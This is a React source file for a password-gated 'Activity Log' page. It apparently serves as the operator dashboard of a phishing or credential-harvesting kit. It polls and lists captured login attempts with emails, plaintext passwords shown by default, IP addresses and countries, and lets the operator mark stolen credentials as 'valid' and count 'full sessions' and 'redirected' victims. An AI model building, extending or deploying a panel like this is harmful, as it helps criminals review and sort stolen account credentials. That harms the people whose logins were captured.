import { useState, useEffect, useCallback } from 'react';
import { useLocation } from 'wouter';
import {
  getLogs, applyFilters, getStats, clearLogs, markValid, formatTimestamp,
  type LoginAttempt, type TimeFilter, type StatusFilter,
} from '@/lib/activityLog';
import PasswordGate from '@/components/PasswordGate';
import {
  isGateEnabled, getGatePassword,
  isGateSessionActive, setGateSession,
} from '@/lib/adminAuth';

// ── Icons ────────────────────────────────────────────────────────────────────
function PulseIcon({ size = 20, color = '#f26522' }: { size?: number; color?: string }) {
  return (
    <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="22 12 18 12 15 21 9 3 6 12 2 12" />
    </svg>
  );
}
function RefreshIcon() {
  return (
    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="23 4 23 10 17 10" /><polyline points="1 20 1 14 7 14" />
      <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15" />
    </svg>
  );
}
function ArrowLeftIcon() {
  return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <line x1="19" y1="12" x2="5" y2="12" /><polyline points="12 19 5 12 12 5" />
    </svg>
  );
}
function ListIcon() {
  return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <line x1="8" y1="6" x2="21" y2="6" /><line x1="8" y1="12" x2="21" y2="12" />
      <line x1="8" y1="18" x2="21" y2="18" /><line x1="3" y1="6" x2="3.01" y2="6" />
      <line x1="3" y1="12" x2="3.01" y2="12" /><line x1="3" y1="18" x2="3.01" y2="18" />
    </svg>
  );
}
function CalendarIcon() {
  return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <rect x="3" y="4" width="18" height="18" rx="2" ry="2" /><line x1="16" y1="2" x2="16" y2="6" />
      <line x1="8" y1="2" x2="8" y2="6" /><line x1="3" y1="10" x2="21" y2="10" />
    </svg>
  );
}
function ClockIcon() {
  return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="10" /><polyline points="12 6 12 12 16 14" />
    </svg>
  );
}
function TrashIcon() {
  return (
    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="3 6 5 6 21 6" />
      <path d="M19 6l-1 14H6L5 6" /><path d="M10 11v6M14 11v6" />
      <path d="M9 6V4h6v2" />
    </svg>
  );
}
function GlobeIcon() {
  return (
    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="10" />
      <line x1="2" y1="12" x2="22" y2="12" />
      <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
    </svg>
  );
}

// ── Status badge ─────────────────────────────────────────────────────────────
function StatusBadge({ status }: { status: LoginAttempt['status'] }) {
  const map: Record<string, { label: string; cls: string }> = {
    success:    { label: 'Success',    cls: 'al-badge-success' },
    failed:     { label: 'Failed',     cls: 'al-badge-failed' },
    redirected: { label: 'Redirected', cls: 'al-badge-redirected' },
  };
  const { label, cls } = map[status] ?? map.failed;
  return <span className={`al-badge ${cls}`}>{label}</span>;
}

// ── Main component ────────────────────────────────────────────────────────────
function ActivityLogInner() {
  const [, navigate] = useLocation();
  const [allLogs, setAllLogs] = useState<LoginAttempt[]>([]);
  const [timeFilter, setTimeFilter] = useState<TimeFilter>('all');
  const [statusFilter, setStatusFilter] = useState<StatusFilter>('all');
  const [showPasswords, setShowPasswords] = useState(true);

  const refresh = useCallback(() => {
    setAllLogs(getLogs());
  }, []);

  useEffect(() => {
    refresh();
    // Poll every 5 s so it picks up new login attempts live
    const id = setInterval(refresh, 5000);
    return () => clearInterval(id);
  }, [refresh]);

  const filtered = applyFilters(allLogs, timeFilter, statusFilter);
  const stats = getStats(allLogs);

  const handleMarkValid = (id: string) => {
    markValid(id);
    refresh();
  };

  const handleClear = () => {
    if (window.confirm('Clear all activity logs? This cannot be undone.')) {
      clearLogs();
      refresh();
    }
  };

  return (
    <div className="al-page">

      {/* ── Header ── */}
      <div className="al-header">
        <div className="al-header-left">
          <PulseIcon size={22} color="#f26522" />
          <div>
            <h1 className="al-title">Activity Log</h1>
            <p className="al-subtitle">{allLogs.length} total attempt{allLogs.length !== 1 ? 's' : ''} recorded</p>
          </div>
        </div>
        <div className="al-header-right">
          <button className="al-btn-outline" onClick={refresh}>
            <RefreshIcon /> Refresh
          </button>
          <button className="al-btn-outline" onClick={handleClear} title="Clear all logs">
            <TrashIcon /> Clear
          </button>
          <button className="al-btn-dark" onClick={() => navigate('/')}>
            <ArrowLeftIcon /> Admin Panel
          </button>
        </div>
      </div>

      {/* ── Stat cards ── */}
      <div className="al-stats">
        <div className="al-stat-card">
          <span className="al-stat-num al-num-black">{stats.totalAttempts}</span>
          <span className="al-stat-label">Total Attempts</span>
        </div>
        <div className="al-stat-card">
          <span className="al-stat-num al-num-red">{stats.fullSessions}</span>
          <span className="al-stat-label">Full Sessions</span>
        </div>
        <div className="al-stat-card">
          <span className="al-stat-num al-num-blue">{stats.uniqueEmails}</span>
          <span className="al-stat-label">Unique Emails</span>
        </div>
        <div className="al-stat-card">
          <span className="al-stat-num al-num-green">{stats.markedValid}</span>
          <span className="al-stat-label">Marked Valid</span>
        </div>
      </div>

      {/* ── Filter row ── */}
      <div className="al-filters">
        <div className="al-filters-left">
          <button
            className={`al-filter-pill${timeFilter === 'all' ? ' al-filter-active-dark' : ''}`}
            onClick={() => setTimeFilter('all')}
          >
            <ListIcon /> All Time
          </button>
          <button
            className={`al-filter-pill${timeFilter === 'today' ? ' al-filter-active-dark' : ''}`}
            onClick={() => setTimeFilter('today')}
          >
            <CalendarIcon /> Today
          </button>
          <button
            className={`al-filter-pill${timeFilter === 'last1h' ? ' al-filter-active-dark' : ''}`}
            onClick={() => setTimeFilter('last1h')}
          >
            <ClockIcon /> Last 1 Hour
          </button>
        </div>
        <div className="al-filters-right">
          <button
            className={`al-filter-pill${statusFilter === 'all' ? ' al-filter-active-orange' : ''}`}
            onClick={() => setStatusFilter('all')}
          >
            All
          </button>
          <button
            className={`al-filter-pill${statusFilter === 'failed' ? ' al-filter-active-orange' : ''}`}
            onClick={() => setStatusFilter('failed')}
          >
            Failed
          </button>
          <button
            className={`al-filter-pill${statusFilter === 'redirected' ? ' al-filter-active-orange' : ''}`}
            onClick={() => setStatusFilter('redirected')}
          >
            Redirected
          </button>
        </div>
      </div>

      {/* ── Log table ── */}
      <div className="al-table-card">
        {filtered.length === 0 ? (
          <div className="al-empty">
            <PulseIcon size={32} color="#ccc" />
            <p>No attempts in this filter.</p>
          </div>
        ) : (
          <div className="al-table-wrap">
            <table className="al-table">
              <thead>
                <tr>
                  <th>Time</th>
                  <th>Email</th>
                  <th>
                    <span className="al-th-pw">
                      Password
                      <button
                        className="al-pw-toggle"
                        onClick={() => setShowPasswords(v => !v)}
                        title={showPasswords ? 'Hide passwords' : 'Show passwords'}
                      >
                        {showPasswords ? '🙈 Hide' : '👁 Show'}
                      </button>
                    </span>
                  </th>
                  <th><GlobeIcon /> IP Address</th>
                  <th>Country</th>
                  <th>Status</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody>
                {filtered.map(log => (
                  <tr key={log.id} className={log.markedValid ? 'al-row-valid' : ''}>
                    <td className="al-td-time">{formatTimestamp(log.timestamp)}</td>
                    <td className="al-td-email">{log.email}</td>
                    <td className="al-td-pass">
                      {showPasswords ? log.password : '••••••••'}
                    </td>
                    <td className="al-td-ip">{log.ip}</td>
                    <td className="al-td-country">
                      {log.countryCode !== '--' && (
                        <img
                          src={`https://flagcdn.com/16x12/${log.countryCode.toLowerCase()}.png`}
                          alt={log.country}
                          width="16"
                          height="12"
                          style={{ marginRight: 6, verticalAlign: 'middle' }}
                          onError={e => { (e.target as HTMLImageElement).style.display = 'none'; }}
                        />
                      )}
                      {log.country}
                    </td>
                    <td><StatusBadge status={log.status} /></td>
                    <td>
                      {!log.markedValid && (
                        <button
                          className="al-action-btn"
                          onClick={() => handleMarkValid(log.id)}
                          title="Mark as valid"
                        >
                          Mark Valid
                        </button>
                      )}
                      {log.markedValid && (
                        <span className="al-valid-tick">✓ Valid</span>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* ── Footer count ── */}
      <p className="al-count">
        Showing {filtered.length} of {allLogs.length} total log{allLogs.length !== 1 ? 's' : ''}
      </p>
    </div>
  );
}

// ── Gate wrapper ──────────────────────────────────────────────────────────────
export default function ActivityLog() {
  const [unlocked, setUnlocked] = useState(isGateSessionActive());

  if (!unlocked) {
    return (
      <PasswordGate
        title="Activity Log"
        subtitle="This page is restricted. Enter the gate password set by the admin to continue."
        onUnlock={(pw) => {
          if (pw === getGatePassword()) {
            setGateSession();
            setUnlocked(true);
            return true;
          }
          return false;
        }}
      />
    );
  }

  return <ActivityLogInner />;
}
